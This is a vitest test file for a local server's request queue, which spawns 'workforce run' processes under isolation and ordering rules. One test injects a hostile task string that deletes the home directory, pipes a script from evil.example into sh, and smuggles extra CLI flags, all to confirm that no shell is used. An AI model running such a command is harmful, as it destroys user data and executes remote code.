/**
 * `POST /api/requests` and its queue: a request becomes exactly one
 * `workforce run --project --department` argument array, and it starts only
 * when the isolation rules allow — one live run per project in arrival order,
 * the global cap, a roster with a runtime that has no verified file boundary
 * running on its own, and no worker in two live runs. What is still waiting when
 * the server stops is held, never started, on the next start.
 *
 * The spawned process is a small stand-in that behaves like `workforce run
 * --json` on stdout (a `run.created` line, then a result document) and runs
 * until the test releases it or interrupts it, so every rule is observed on
 * real processes. The last test starts the real CLI.
 */
import { spawn, type ChildProcess, type SpawnOptions } from 'node:child_process';
import { existsSync, readFileSync, utimesSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { CODEX_CAPABILITIES, defaultFakeRuntimeScript, FAKE_SCENARIO_ENV } from '../../src/adapters/index.js';
import { parseCliArgs } from '../../src/cli/index.js';
import type { RuntimeReadinessReport } from '../../src/discovery/readiness.js';
import { startOfficeServer, type OfficeServer, type OfficeServerOptions } from '../../src/server/index.js';
import type { CliInvocation, Spawner } from '../../src/server/launch.js';
import { HELD_REASON, RequestQueue } from '../../src/server/requests.js';
import { openStateStore } from '../../src/storage/db.js';
import { appendEvent } from '../../src/storage/events.js';
import { ensureRunDir } from '../../src/storage/paths.js';
import { insertRun } from '../../src/storage/records.js';
import { applyWorkspaceOps, parseWorkspaceOps } from '../../src/workspace/operations.js';
import { projectStatePaths, projectStateRoot } from '../../src/workspace/paths.js';
import { buildRoster, rosterAgentConfig, writeRosterSnapshot } from '../../src/workspace/roster.js';
import { loadWorkspace, updateWorkspace } from '../../src/workspace/store.js';
import { sampleRequest, TEST_LIMITS } from '../helpers/state.js';
import { cleanupAll, gitRepo, registerCleanup, tempDir } from '../workspace/helpers.js';
import { cleanupAll as cleanupFixtures, fingerprintCheckout, fixTheBugScenario, useFixture, writeScenario } from '../workspaces/support.js';
import { originFor, rawRequest, sleep, tokenFrom, type RawResponse } from './support.js';

afterEach(() => {
  cleanupAll();
  cleanupFixtures();
});

const REPO_ROOT = fileURLToPath(new URL('../..', import.meta.url));
const CLI_ENTRY = fileURLToPath(new URL('../../src/cli/index.ts', import.meta.url));
const STUB_INVOCATION: CliInvocation = { command: '/opt/workforce/bin/node', args: ['--import', 'tsx', '/opt/workforce/src/cli/index.ts'], cwd: REPO_ROOT };

/** Behaves like `workforce run --json` on stdout. argv: control dir, release name, mode (hold | refuse). */
const STUB = `
const fs = process.getBuiltinModule('fs');
const path = process.getBuiltinModule('path');
const [control, name, mode] = process.argv.slice(1);
const runId = 'run-' + name.replace(/[^a-z0-9-]/g, '') + '-' + process.pid;
const finish = (code, error) => {
  process.stdout.write(JSON.stringify({ ok: code === 0, command: 'run', exitCode: code, ...(error ? { error } : { runId }) }) + '\\n');
  process.exit(code);
};
if (mode === 'refuse') finish(4, { code: 'head_planning_unavailable', message: 'head planning not available in this build', details: ['detail line'] });
process.stdout.write(JSON.stringify({ type: 'run.created', runId }) + '\\n');
if (mode === 'result-then-hold') process.stdout.write(JSON.stringify({ ok: true, command: 'run', exitCode: 0, runId }) + '\\n');
process.on('SIGINT', () => finish(130, { code: 'interrupted', message: 'stopped by an interrupt', details: [] }));
const timer = setInterval(() => { if (fs.existsSync(path.join(control, 'release-' + name))) { clearInterval(timer); finish(0); } }, 20);
`;

interface SpawnCall {
  readonly command: string;
  readonly args: ReadonlyArray<string>;
  readonly cliArgv: ReadonlyArray<string>;
  readonly options: SpawnOptions;
  readonly name: string;
}

interface Harness {
  readonly calls: SpawnCall[];
  readonly spawner: Spawner;
  release(name: string): void;
}

/** Records every spawn and runs the stand-in. Release names are `<project>-<n>` (`resume-<n>`), n counting spawns from 1. */
function harness(modes: Record<string, 'hold' | 'refuse' | 'result-then-hold'> = {}): Harness {
  const control = tempDir('workforce-queue-control-');
  const calls: SpawnCall[] = [];
  const children: ChildProcess[] = [];
  registerCleanup(() => {
    for (const child of children) if (child.exitCode === null && child.signalCode === null) child.kill('SIGKILL');
  });
  const spawner: Spawner = (command, args, options) => {
    const cliArgv = args.slice(STUB_INVOCATION.args.length);
    const project = cliArgv.find((argument) => argument.startsWith('--project='))?.slice('--project='.length) ?? 'resume';
    const name = `${project}-${calls.length + 1}`;
    calls.push({ command, args: [...args], cliArgv, options, name });
    const child = spawn(process.execPath, ['-e', STUB, control, name, modes[project] ?? 'hold'], { ...options, shell: false });
    children.push(child);
    return child;
  };
  return { calls, spawner, release: (name) => writeFileSync(path.join(control, `release-${name}`), '') };
}

function codexReport(): RuntimeReadinessReport {
  return {
    adapter: 'codex',
    displayName: 'Codex',
    installed: true,
    adapterSupported: true,
    controllable: true,
    auth: 'logged_in',
    authDetail: 'test report',
    readiness: 'ready',
    // The build the write boundary was established on, so a Codex writer needs no consent.
    version: CODEX_CAPABILITIES.write_containment.testedVersion,
    checkedAt: new Date().toISOString(),
  } as unknown as RuntimeReadinessReport;
}

/**
 * Three projects with checks. Engineering (head Atlas) has one worker per
 * project. Research (head Iris) has Shared on checkout and billing, and Forge on
 * search, on Claude Code. Design has a head and no worker.
 */
async function workspace(extraOps: Array<Record<string, unknown>> = []): Promise<string> {
  const stateRoot = path.join(tempDir('workforce-queue-'), 'state');
  const repos = await Promise.all(['checkout', 'billing', 'search', 'docs'].map((name) => gitRepo({ 'README.md': `${name}\n` })));
  updateWorkspace(stateRoot, (current) =>
    applyWorkspaceOps(
      current,
      parseWorkspaceOps([
        { op: 'project.add', repoPath: repos[0], name: 'checkout', checks: ['node --version'] },
        { op: 'project.add', repoPath: repos[1], name: 'billing', checks: ['node --version'] },
        { op: 'project.add', repoPath: repos[2], name: 'search', checks: ['node --version'] },
        { op: 'project.add', repoPath: repos[3], name: 'docs' },
        { op: 'department.add', id: 'eng', name: 'Engineering' },
        { op: 'agent.add', id: 'atlas', name: 'Atlas', role: 'head', departmentId: 'eng', runtime: 'codex-local' },
        { op: 'agent.add', id: 'nova', name: 'Nova', role: 'worker', departmentId: 'eng', runtime: 'codex-local', projectIds: ['checkout', 'docs'] },
        { op: 'agent.add', id: 'probe', name: 'Probe', role: 'worker', departmentId: 'eng', runtime: 'codex-local', projectIds: ['billing'] },
        { op: 'agent.add', id: 'echo', name: 'Echo', role: 'worker', departmentId: 'eng', runtime: 'codex-local', projectIds: ['search'] },
        { op: 'department.add', id: 'research', name: 'Research' },
        { op: 'agent.add', id: 'iris', name: 'Iris', role: 'head', departmentId: 'research', runtime: 'codex-local' },
        { op: 'agent.add', id: 'shared', name: 'Shared', role: 'worker', departmentId: 'research', runtime: 'codex-local', projectIds: ['checkout', 'billing'] },
        { op: 'agent.add', id: 'forge', name: 'Forge', role: 'worker', departmentId: 'research', runtime: 'claude-local', projectIds: ['search'] },
        { op: 'department.add', id: 'design', name: 'Design' },
        { op: 'agent.add', id: 'mo', name: 'Mo', role: 'head', departmentId: 'design', runtime: 'codex-local' },
        ...extraOps,
      ]),
    ),
  );
  return stateRoot;
}

interface Office {
  readonly server: OfficeServer;
  readonly token: string;
}

async function office(stateRoot: string, h: Harness, extra: Partial<OfficeServerOptions> = {}): Promise<Office> {
  const server = await startOfficeServer({ stateRoot, port: 0, discover: async () => [codexReport()], spawner: h.spawner, cliInvocation: STUB_INVOCATION, queuePollMs: 40, ...extra });
  registerCleanup(() => void server.close());
  return { server, token: await tokenFrom(server) };
}

function post(target: Office, route: string, body: unknown = {}): Promise<RawResponse> {
  return rawRequest(target.server, {
    method: 'POST',
    path: route,
    headers: { origin: originFor(target.server), 'x-workforce-token': target.token, 'content-type': 'application/json' },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });
}

function json(response: { body: string }): Record<string, any> {
  return JSON.parse(response.body) as Record<string, any>;
}

async function send(target: Office, projectId: string, departmentId: string, task: string, extra: Record<string, unknown> = {}): Promise<Record<string, any>> {
  const response = await post(target, '/api/requests', { projectId, departmentId, task, ...extra });
  expect({ status: response.status, body: response.status === 202 ? 'accepted' : response.body }).toEqual({ status: 202, body: 'accepted' });
  return json(response).request;
}

async function item(target: Office, id: string): Promise<Record<string, any>> {
  return json(await rawRequest(target.server, { path: `/api/requests/${id}` })).request;
}

async function until(target: Office, id: string, accept: (request: Record<string, any>) => boolean, timeoutMs = 15_000): Promise<Record<string, any>> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const current = await item(target, id);
    if (accept(current)) return current;
    if (Date.now() > deadline) throw new Error(`request ${id} did not reach the expected state; last: ${JSON.stringify(current)}`);
    await sleep(25);
  }
}

const running = (request: Record<string, any>) => request.state === 'running';
const ended = (request: Record<string, any>) => request.state === 'ended';

describe('a request becomes exactly one `workforce run --project --department` argument array', () => {
  it('never uses a shell, carries the task verbatim, and the item ends with what the process printed', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);
    const hostile = `Fix it"; rm -rf ~ && $(curl https://evil.example | sh) \`id\`\n--state-dir=/tmp/elsewhere --project=billing -- --help`;

    const response = await post(target, '/api/requests', { projectId: 'checkout', departmentId: 'eng', task: hostile });
    expect(response.status).toBe(202);
    expect(json(response)).toMatchObject({ ok: true, started: true, request: { state: 'starting', projectId: 'checkout', departmentId: 'eng', task: hostile, exclusive: false, workerIds: ['nova'] } });
    const id = json(response).request.id as string;

    expect(h.calls).toHaveLength(1);
    const [call] = h.calls;
    expect(call!.options.shell).toBe(false);
    expect(call!.options.detached).toBe(true);
    expect((call!.options.stdio as unknown[])[0]).toBe('ignore');
    expect(call!.command).toBe(STUB_INVOCATION.command);
    expect(call!.cliArgv).toEqual(['run', '--json', '--project=checkout', '--department=eng', `--task=${hostile}`, `--state-dir=${stateRoot}`]);
    const parsed = parseCliArgs(call!.cliArgv);
    expect(parsed).toMatchObject({ command: 'run', positionals: [], project: 'checkout', department: 'eng', task: hostile, stateDir: stateRoot, json: true, allowUnconfinedWrites: false, help: false });

    const live = await until(target, id, running);
    expect(live.runId).toMatch(/^run-checkout-1-\d+$/);
    h.release('checkout-1');
    const done = await until(target, id, ended);
    expect(done).toMatchObject({ exitCode: 0, result: { exitCode: 0, code: null }, runId: live.runId });

    const persisted = JSON.parse(readFileSync(path.join(stateRoot, 'serve', 'requests.json'), 'utf8')) as { schemaVersion: number; items: Array<{ id: string; state: string }> };
    expect(persisted.schemaVersion).toBe(1);
    expect(persisted.items.find((entry) => entry.id === id)?.state).toBe('ended');
  });

  it('passes --state-dir only when the server was given one', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h, { passStateDir: false });
    await send(target, 'checkout', 'eng', 'Fix it.');
    expect(h.calls[0]!.cliArgv).toEqual(['run', '--json', '--project=checkout', '--department=eng', '--task=Fix it.']);
  });

  it('refuses what the run would refuse — and asks for consent for a writer without a file boundary — before anything is queued', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);
    const cases: Array<{ body: unknown; status: number; code: string }> = [
      { body: {}, status: 400, code: 'invalid_body' },
      { body: { projectId: 'checkout', departmentId: 'eng', task: '  \n ' }, status: 400, code: 'invalid_body' },
      { body: { projectId: 'checkout', departmentId: 'eng', task: 'Fix it.', shell: true }, status: 400, code: 'invalid_body' },
      { body: { projectId: 'nope', departmentId: 'eng', task: 'Fix it.' }, status: 400, code: 'unknown_project' },
      { body: { projectId: 'checkout', departmentId: 'nope', task: 'Fix it.' }, status: 400, code: 'unknown_department' },
      { body: { projectId: 'checkout', departmentId: 'design', task: 'Fix it.' }, status: 400, code: 'no_worker_on_project' },
      { body: { projectId: 'docs', departmentId: 'eng', task: 'Fix it.' }, status: 400, code: 'project_has_no_checks' },
      { body: { projectId: 'search', departmentId: 'research', task: 'Fix it.' }, status: 409, code: 'consent_required' },
      { body: { projectId: 'search', departmentId: 'research', task: 'Fix it.', allowUnconfinedWrites: false }, status: 409, code: 'consent_required' },
    ];
    for (const entry of cases) {
      const response = await post(target, '/api/requests', entry.body);
      expect({ status: response.status, code: json(response).error.code }).toEqual({ status: entry.status, code: entry.code });
      if (entry.code === 'consent_required') {
        expect(json(response).consent.agents.map((agent: { agentId: string }) => agent.agentId)).toEqual(['forge']);
        expect(json(response).error.details[0]).toContain('Forge changes files on Claude Code');
      }
    }
    expect(h.calls).toHaveLength(0);
    expect(json(await rawRequest(target.server, { path: '/api/requests' })).items).toEqual([]);
    // A refusal writes nothing: not even the queue file.
    expect(existsSync(path.join(stateRoot, 'serve'))).toBe(false);

    const empty = await office(path.join(tempDir('workforce-queue-empty-'), 'state'), h);
    const none = await post(empty, '/api/requests', { projectId: 'checkout', departmentId: 'eng', task: 'Fix it.' });
    expect({ status: none.status, code: json(none).error.code }).toEqual({ status: 400, code: 'no_workspace' });
    expect(h.calls).toHaveLength(0);
  });
});

describe('when a request starts', () => {
  it('waits behind the running request for the same project, and requests for one project start in arrival order', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);

    const first = await send(target, 'checkout', 'eng', 'first');
    const second = await send(target, 'checkout', 'research', 'second');
    const third = await send(target, 'checkout', 'eng', 'third');
    expect(first.state).toBe('starting');
    expect(second).toMatchObject({ state: 'queued', reason: 'waiting: another task is running on checkout' });
    expect(third).toMatchObject({ state: 'queued', reason: 'waiting: another task is running on checkout' });
    expect(h.calls).toHaveLength(1);

    h.release('checkout-1');
    await until(target, second.id, running);
    expect(h.calls[1]!.cliArgv).toContain('--task=second');
    expect(await item(target, third.id)).toMatchObject({ state: 'queued', reason: 'waiting: another task is running on checkout' });

    h.release('checkout-2');
    await until(target, third.id, running);
    expect(h.calls.map((call) => call.cliArgv.find((argument) => argument.startsWith('--task=')))).toEqual(['--task=first', '--task=second', '--task=third']);
  });

  it('holds the global cap of concurrent project runs, and a raised limit lets the next one start', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);

    const checkout = await send(target, 'checkout', 'eng', 'checkout work');
    const billing = await send(target, 'billing', 'eng', 'billing work');
    const search = await send(target, 'search', 'eng', 'search work');
    expect([checkout.state, billing.state]).toEqual(['starting', 'starting']);
    expect(search).toMatchObject({ state: 'queued', reason: 'waiting: 2 tasks are already running (your limit is 2)' });
    const queue = json(await rawRequest(target.server, { path: '/api/requests' }));
    expect(queue.live.map((run: { projectId: string }) => run.projectId).sort()).toEqual(['billing', 'checkout']);
    expect(queue.limits).toEqual({ maxConcurrentProjectRuns: 2 });

    h.release('billing-2');
    await until(target, search.id, running);
    expect(h.calls).toHaveLength(3);

    // The limit is configuration: raising it is what lets a waiting request start.
    const more = await send(target, 'billing', 'eng', 'more billing work');
    expect(more.reason).toBe('waiting: 2 tasks are already running (your limit is 2)');
    const revision = loadWorkspace(stateRoot).config.revision;
    expect((await post(target, '/api/workspace/ops', { expectRevision: revision, ops: [{ op: 'limits.set', limits: { maxConcurrentProjectRuns: 3 } }] })).status).toBe(200);
    await until(target, more.id, running);
  });

  it('runs a roster with Claude Code on its own: it waits for the others, and nothing starts beside it', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);

    const checkout = await send(target, 'checkout', 'eng', 'checkout work');
    const claude = await send(target, 'search', 'research', 'search work', { allowUnconfinedWrites: true });
    expect(claude).toMatchObject({ state: 'queued', exclusive: true, unconfinedRuntimes: ['Claude Code'], reason: 'waiting: a Claude Code task runs on its own, so this starts when the running task finishes' });
    const later = await send(target, 'billing', 'eng', 'billing work');
    expect(later).toMatchObject({ state: 'queued', reason: 'waiting: a Claude Code task that arrived earlier runs on its own first' });
    expect(h.calls).toHaveLength(1);

    h.release('checkout-1');
    await until(target, claude.id, running);
    expect(h.calls[1]!.cliArgv).toEqual(['run', '--json', '--project=search', '--department=research', '--task=search work', '--allow-unconfined-writes', `--state-dir=${stateRoot}`]);
    expect(await item(target, later.id)).toMatchObject({ state: 'queued', reason: 'waiting: a Claude Code task runs on its own' });
    const queue = json(await rawRequest(target.server, { path: '/api/requests' }));
    expect(queue.live).toEqual([expect.objectContaining({ projectId: 'search', runsOnItsOwn: true, runsOnItsOwnBecause: 'Claude Code has no verified file boundary' })]);

    h.release('search-2');
    await until(target, later.id, running);
  });

  it('never puts a worker in two live runs', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);

    const first = await send(target, 'checkout', 'research', 'checkout review');
    const overlap = await send(target, 'billing', 'research', 'billing review');
    expect(first.state).toBe('starting');
    expect(overlap).toMatchObject({ state: 'queued', reason: 'waiting: Shared is busy on checkout' });
    // The same head in two departments' runs is not a worker; Engineering on search starts.
    const other = await send(target, 'search', 'eng', 'search work');
    expect(other.state).toBe('starting');

    h.release('checkout-1');
    await until(target, overlap.id, running);
  });

  it('counts a run started outside this page from its project lock, and refuses to remove that project', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);
    const terminal = openStateStore(projectStatePaths(stateRoot, 'checkout'), { mode: 'mutating' });
    registerCleanup(() => terminal.close());

    const sameProject = await send(target, 'checkout', 'eng', 'checkout work');
    expect(sameProject).toMatchObject({ state: 'queued', reason: 'waiting: another task is running on checkout' });
    const elsewhere = await send(target, 'billing', 'eng', 'billing work');
    expect(elsewhere).toMatchObject({
      state: 'queued',
      reason: 'waiting: a task started outside this page is running on checkout, and what it runs on could not be read, so nothing starts beside it',
    });
    const queue = json(await rawRequest(target.server, { path: '/api/requests' }));
    expect(queue.live).toEqual([expect.objectContaining({ projectId: 'checkout', startedOutsideThisPage: true, runsOnItsOwn: true })]);
    const revision = loadWorkspace(stateRoot).config.revision;
    const remove = await post(target, '/api/workspace/ops', { expectRevision: revision, ops: [{ op: 'project.remove', id: 'checkout' }] });
    expect(remove.status).toBe(409);
    expect(h.calls).toHaveLength(0);

    terminal.close();
    await until(target, sameProject.id, running);
    await until(target, elsewhere.id, running);
  });

  it('does not infer an external process’s containment from a stale pending run or recently written old roster', async () => {
    const stateRoot = await workspace();
    const config = loadWorkspace(stateRoot).config;
    const roster = buildRoster(config, { projectId: 'checkout', departmentId: 'eng' });
    const recordedConfig = rosterAgentConfig(config, roster);
    const paths = projectStatePaths(stateRoot, 'checkout');
    const terminal = openStateStore(paths, { mode: 'mutating' });
    registerCleanup(() => terminal.close());
    const run = insertRun(terminal.db, { request: sampleRequest(), policy: 'local-development', limits: TEST_LIMITS, now: new Date(Date.now() - 60_000).toISOString() });
    ensureRunDir(paths, run.id);
    writeFileSync(paths.runConfigSnapshotPath(run.id), JSON.stringify({ raw: recordedConfig }));
    const snapshot = writeRosterSnapshot(paths, roster, recordedConfig);
    // Even a roster written only half a second before this owner acquired the
    // lock belongs to a previous process; its Codex boundary is not proof of
    // what the current unknown process runs on.
    const lock = JSON.parse(readFileSync(paths.lockPath, 'utf8')) as { acquiredAt: string };
    const earlier = new Date(Date.parse(lock.acquiredAt) - 500);
    utimesSync(snapshot.path, earlier, earlier);

    const h = harness();
    const target = await office(stateRoot, h);
    const waiting = await send(target, 'billing', 'eng', 'billing work');
    expect(waiting).toMatchObject({ state: 'queued', reason: expect.stringContaining('what it runs on could not be read') });
    expect(h.calls).toHaveLength(0);

    terminal.close();
    await until(target, waiting.id, running);
    expect(h.calls).toHaveLength(1);
  });

  it('ends an item with the run process’s own refusal when it exits before recording a run', async () => {
    const stateRoot = await workspace();
    const h = harness({ billing: 'refuse' });
    const target = await office(stateRoot, h);
    const refused = await send(target, 'billing', 'eng', 'billing work');
    const done = await until(target, refused.id, ended);
    expect(done).toMatchObject({ exitCode: 4, runId: null, result: { exitCode: 4, code: 'head_planning_unavailable', message: 'head planning not available in this build', details: ['detail line'] } });
  });
});

describe('held on restart', () => {
  it('keeps a restarted process exclusive until it exits even if it has already printed a result', async () => {
    const stateRoot = await workspace();
    const h = harness({ search: 'result-then-hold' });
    const first = await office(stateRoot, h);
    const live = await send(first, 'search', 'research', 'search work', { allowUnconfinedWrites: true });
    await until(first, live.id, running);
    await first.server.close();

    const second = await office(stateRoot, h);
    expect(await item(second, live.id)).toMatchObject({ state: 'running', endedAt: null });
    const waiting = await send(second, 'billing', 'eng', 'billing work');
    expect(waiting).toMatchObject({ state: 'queued', reason: 'waiting: a Claude Code task runs on its own' });
    expect(h.calls).toHaveLength(1);

    h.release('search-1');
    await until(second, live.id, ended);
    await until(second, waiting.id, running);
    expect(h.calls).toHaveLength(2);
  });

  it('shows the owning server’s live reservations on a second read-only page server', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const first = await office(stateRoot, h);
    const request = await send(first, 'checkout', 'research', 'checkout review');
    const second = await office(stateRoot, h);

    const queue = json(await rawRequest(second.server, { path: '/api/requests' }));
    expect(queue).toMatchObject({ accepting: false, managedElsewhere: expect.stringContaining('another workforce serve process') });
    expect(queue.live).toEqual([expect.objectContaining({ projectId: 'checkout', requestId: request.id, workerIds: ['shared'], startedOutsideThisPage: false })]);
    expect((await post(second, '/api/requests', { projectId: 'billing', departmentId: 'eng', task: 'billing work' })).status).toBe(409);
    expect(h.calls).toHaveLength(1);
  });

  it('holds what was still waiting when the server stopped, starts nothing on its own, and Start and Discard act on it', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const first = await office(stateRoot, h);
    const live = await send(first, 'checkout', 'eng', 'first');
    const waiting = await send(first, 'checkout', 'eng', 'second');
    const unwanted = await send(first, 'checkout', 'eng', 'third');
    await until(first, live.id, running);
    await first.server.close();

    const second = await office(stateRoot, h);
    const queue = json(await rawRequest(second.server, { path: '/api/requests' }));
    const byId = new Map<string, Record<string, any>>(queue.items.map((entry: Record<string, any>) => [entry.id, entry]));
    expect(byId.get(waiting.id)).toMatchObject({ state: 'held', reason: HELD_REASON });
    expect(byId.get(unwanted.id)).toMatchObject({ state: 'held', reason: HELD_REASON });
    // The run the first server started keeps going and is still tracked.
    expect(byId.get(live.id)).toMatchObject({ state: 'running' });

    h.release('checkout-1');
    await until(second, live.id, ended);
    await sleep(400);
    expect(h.calls).toHaveLength(1);
    expect(await item(second, waiting.id)).toMatchObject({ state: 'held' });

    expect(json(await post(second, `/api/requests/${unwanted.id}/discard`)).request).toMatchObject({ state: 'discarded' });
    expect((await post(second, `/api/requests/${unwanted.id}/start`)).status).toBe(409);
    const started = await post(second, `/api/requests/${waiting.id}/start`);
    expect(started.status).toBe(200);
    await until(second, waiting.id, running);
    expect(h.calls[1]!.cliArgv).toContain('--task=second');
    expect(h.calls).toHaveLength(2);
    expect(json(await post(second, `/api/requests/${waiting.id}/discard`)).error.code).toBe('not_waiting');
  });
});

describe('stop and resume', () => {
  it('admits only one concurrent resume while passive discovery is pending', async () => {
    const stateRoot = await workspace();
    const config = loadWorkspace(stateRoot).config;
    const roster = buildRoster(config, { projectId: 'checkout', departmentId: 'eng' });
    const paths = projectStatePaths(stateRoot, 'checkout');
    const store = openStateStore(paths, { mode: 'mutating' });
    let runId: string;
    try {
      runId = insertRun(store.db, { request: sampleRequest(), policy: 'local-development', limits: TEST_LIMITS }).id;
    } finally {
      store.close();
    }
    ensureRunDir(paths, runId);
    writeFileSync(paths.runConfigSnapshotPath(runId), JSON.stringify({ raw: rosterAgentConfig(config, roster) }));

    let discoveryCalls = 0;
    let finishDiscovery!: () => void;
    const discovery = new Promise<void>((resolve) => { finishDiscovery = resolve; });
    const h = harness();
    const queue = new RequestQueue({
      stateRoot,
      passStateDir: true,
      env: process.env,
      spawner: h.spawner,
      invocation: STUB_INVOCATION,
      readiness: async () => {
        discoveryCalls += 1;
        await discovery;
        return { checkedAt: new Date().toISOString(), reports: [codexReport()] };
      },
    });
    registerCleanup(() => queue.close());
    const first = queue.resume('checkout', runId, {});
    const second = queue.resume('checkout', runId, {});
    expect(discoveryCalls).toBe(2);
    finishDiscovery();
    const outcomes = await Promise.allSettled([first, second]);
    expect(outcomes.map((outcome) => outcome.status)).toEqual(['fulfilled', 'rejected']);
    expect(outcomes[1]).toMatchObject({ reason: { code: 'resume_already_requested' } });
    expect(h.calls).toHaveLength(1);
    expect(queue.list().items).toHaveLength(1);
  });

  it('stops a live run with SIGINT to its tracked pid, and the item ends with what the run printed', async () => {
    const stateRoot = await workspace();
    const h = harness();
    const target = await office(stateRoot, h);
    const request = await send(target, 'checkout', 'eng', 'checkout work');
    const live = await until(target, request.id, running);

    const stop = await post(target, `/api/projects/checkout/runs/${live.runId}/stop`);
    expect(stop.status).toBe(202);
    expect(json(stop).request.stopRequestedAt).not.toBeNull();
    expect(json(stop).request.reason).toMatch(/^stopping: /);
    const done = await until(target, request.id, ended);
    expect(done).toMatchObject({ exitCode: 130, result: { exitCode: 130, code: 'interrupted' } });

    expect(json(await post(target, `/api/requests/${request.id}/stop`)).error.code).toBe('not_running');
    const notHere = await post(target, '/api/projects/billing/runs/0190aaaa-elsewhere/stop');
    expect({ status: notHere.status, code: json(notHere).error.code }).toEqual({ status: 409, code: 'not_started_here' });
  });

  it('resumes a project run as `workforce resume` with that project’s state root, through the same queue', async () => {
    const stateRoot = await workspace();
    const config = loadWorkspace(stateRoot).config;
    const roster = buildRoster(config, { projectId: 'checkout', departmentId: 'eng' });
    const paths = projectStatePaths(stateRoot, 'checkout');
    const store = openStateStore(paths, { mode: 'mutating' });
    let runId: string;
    try {
      runId = insertRun(store.db, { request: sampleRequest(), policy: 'local-development', limits: TEST_LIMITS }).id;
      appendEvent(store.db, { runId, type: 'run.created', payload: {} });
    } finally {
      store.close();
    }
    ensureRunDir(paths, runId);
    writeFileSync(
      paths.runConfigSnapshotPath(runId),
      JSON.stringify({ configPath: path.join(paths.root, 'rosters', `eng.r${config.revision}.0123456789ab.json`), raw: rosterAgentConfig(config, roster) }),
    );

    const h = harness();
    const target = await office(stateRoot, h);
    const resumed = await post(target, `/api/projects/checkout/runs/${runId}/resume`, {});
    expect(resumed.status).toBe(202);
    expect(json(resumed).request).toMatchObject({ kind: 'resume', projectId: 'checkout', departmentId: 'eng', resumeRunId: runId, state: 'starting', workerIds: ['nova'] });
    expect(h.calls[0]!.cliArgv).toEqual(['resume', runId, '--json', `--state-dir=${projectStateRoot(stateRoot, 'checkout')}`]);
    expect(parseCliArgs(h.calls[0]!.cliArgv)).toMatchObject({ command: 'resume', positionals: [runId], stateDir: projectStateRoot(stateRoot, 'checkout'), json: true });

    const again = await post(target, `/api/projects/checkout/runs/${runId}/resume`, {});
    expect(json(again).error.code).toBe('resume_already_requested');
    const behind = await send(target, 'checkout', 'eng', 'more work');
    expect(behind).toMatchObject({ state: 'queued', reason: 'waiting: another task is running on checkout' });
    expect((await post(target, '/api/projects/checkout/runs/0190aaaa-no-such-run/resume', {})).status).toBe(404);
    expect((await post(target, `/api/projects/nope/runs/${runId}/resume`, {})).status).toBe(404);
    expect(h.calls).toHaveLength(1);
  });
});

describe('end to end with the real CLI', () => {
  it('spawns `workforce run --project --department`, and the item ends with exactly the exit code and result the run printed; the checkout is untouched', async () => {
    const fixture = await useFixture('ts-bug');
    const before = await fingerprintCheckout(fixture.path);
    const stateRoot = path.join(tempDir('workforce-queue-e2e-'), 'state');
    updateWorkspace(stateRoot, (current) =>
      applyWorkspaceOps(
        current,
        parseWorkspaceOps([
          { op: 'runtime.set', id: 'fake-local', adapter: 'fake', executable: defaultFakeRuntimeScript() },
          { op: 'project.add', repoPath: fixture.path, name: 'app' },
          { op: 'department.add', id: 'eng', name: 'Engineering' },
          { op: 'agent.add', id: 'lead', name: 'Lead', role: 'head', departmentId: 'eng', runtime: 'fake-local' },
          { op: 'agent.add', id: 'engineer', name: 'Engineer', role: 'worker', departmentId: 'eng', runtime: 'fake-local', projectIds: ['app'] },
        ]),
      ),
    );
    const server = await startOfficeServer({
      stateRoot,
      port: 0,
      discover: async () => [],
      cliInvocation: { command: process.execPath, args: ['--import', 'tsx', CLI_ENTRY], cwd: REPO_ROOT },
      env: { ...process.env, NODE_NO_WARNINGS: '1', [FAKE_SCENARIO_ENV]: writeScenario(fixTheBugScenario()) },
      queuePollMs: 100,
    });
    registerCleanup(() => void server.close());
    const target = { server, token: await tokenFrom(server) };

    const request = await send(target, 'app', 'eng', 'Fix the pagination bug.', { allowUnconfinedWrites: true });
    expect(request).toMatchObject({ exclusive: true, unconfinedRuntimes: ['test runtime'] });
    const done = await until(target, request.id, ended, 150_000);

    const lines = readFileSync(done.stdoutPath as string, 'utf8').trim().split('\n');
    const printed = JSON.parse(lines[lines.length - 1]!) as { exitCode: number; runId?: string; error?: { code: string } };
    expect(done.exitCode).toBe(printed.exitCode);
    expect(done.result).toMatchObject({ exitCode: printed.exitCode, code: printed.error?.code ?? null });
    expect([0, 2, 3, 4]).toContain(printed.exitCode);
    if (printed.exitCode === 0) {
      const status = json(await rawRequest(server, { path: `/api/projects/app/runs/${done.runId as string}` }));
      expect(status.run.state).toBe('ready_for_review');
    }
    expect(existsSync(path.join(stateRoot, 'projects', 'app'))).toBe(true);
    expect(await fingerprintCheckout(fixture.path)).toEqual(before);
  }, 180_000);
});
